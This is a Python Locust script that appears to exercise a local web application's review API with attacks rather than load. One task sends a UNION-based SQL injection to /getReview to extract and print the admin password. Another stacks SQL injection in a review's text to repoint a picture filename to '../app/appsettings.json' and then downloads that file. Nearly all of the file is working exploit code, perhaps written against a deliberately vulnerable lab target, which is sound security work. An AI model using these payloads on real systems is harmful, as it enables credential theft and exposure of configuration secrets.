import json
import datetime
from locust import HttpUser, task, between, run_single_user
from random import random, randrange
from urllib.parse import quote


class ParserUser(HttpUser):
    host = "http://localhost:5173/"
    wait_time = between(1, 5)

    @task
    def credentialSteal(self):
        qs = quote(
            """1 union select 0, 1, 1, now(), now(), "username", "password" from customer where "username" = 'admin'"""
        )
        url = "http://localhost:5183/getReview/" + qs

        # /getReview/{reviewId} injection to get admin pwd
        r = self.client.get(
            url,
            headers={
                "Host": "localhost:5183",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
                "Accept": "text/plain",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "http://localhost:5183/swagger/index.html",
                "DNT": "1",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
            data="",
        )

        print("admin password: {0}".format(r.json()["reviewText"]))

    @task
    def pathTraversal(self):
        # /postReview injection to change picture filename
        r = self.client.post(
            "http://localhost:5183/postReview",
            headers={
                "Host": "localhost:5183",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
                "Accept": "text/plain",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "http://localhost:5183/swagger/index.html",
                "Content-Type": "application/json",
                "Content-Length": "381",
                "Origin": "http://localhost:5183",
                "DNT": "1",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
            data="""{
                "id": 0,
                "itemId": 1,
                "customerId": 1,
                "timeCreated": "2023-04-10T20:11:31.905Z",
                "timeUpdated": "2023-04-10T20:11:31.905Z",
                "title": "string",
                "reviewText": "');update reviewpictures set filename='../app/appsettings.json' where id = 1; insert into reviews (itemid, customerid, timecreated, timeupdated, title, reviewtext) values (1, 1, now(), now(), 'string', '"
            }""",
        )

        # /getPicture/{pictureId} to get file
        r = self.client.get(
            "http://localhost:5183/getPicture/1",
            headers={
                "Host": "localhost:5183",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "http://localhost:5183/swagger/index.html",
                "DNT": "1",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
            data="",
        )

        print(r.text)

    def on_start(self):
        return super().on_start()


if __name__ == "__main__":
    run_single_user(ParserUser)
